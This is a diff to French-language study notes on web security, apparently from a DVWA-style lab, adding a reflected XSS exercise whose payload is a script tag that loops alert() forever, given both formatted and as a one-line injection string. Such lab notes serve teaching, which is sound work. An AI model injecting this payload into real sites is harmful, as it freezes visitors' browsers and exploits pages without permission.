@@ -42,3 +42,21 @@ maintenant.setTime(maintenant.getTime() + 60000) // maintenant + 60 secondes
 document.cookie = "personnalise=toto; expires=" + maintenant.toUTCString() + ";"
 // document.cookie = "PHPSESSIONID=68796817684618471387; expires=" + maintenant.toUTCString() + ";"
 ```
+
+# Cas pratique 
+
+toujours en low / XSS reflected 
+adapter le script pour qu'il affiche à l'infini un alert
+
+
+```html
+<script>
+let msg = "vraiment ??";
+while(true){
+    alert(msg);
+    msg += " tu es sûr ??";
+}
+</script>
+
+<script>let msg = "vraiment ??";while(true){alert(msg);msg += " tu es sûr ??";}</script>
+```
